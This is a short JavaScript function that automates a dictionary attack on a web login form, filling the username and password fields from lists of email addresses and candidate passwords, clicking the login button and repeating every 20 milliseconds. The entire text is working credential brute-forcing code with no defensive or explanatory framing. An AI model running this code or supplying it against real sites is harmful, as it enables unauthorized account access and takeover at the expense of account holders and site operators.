function emailDictionaryAttack(i, j) { // i = 0; j = 0
    console.log('Testing', emails[i], dictionary[j]);
    password.type = 'text';
    username.value = emails[i];
    password.value = dictionary[j];
    loginButton.click();

    j++;

    if (j >= dictionary.length) {
        i++;
        j = 0;
    }

    if (i < emails.length || j < dictionary.length) {
        setTimeout(emailDictionaryAttack, 20, i, j);
    }
}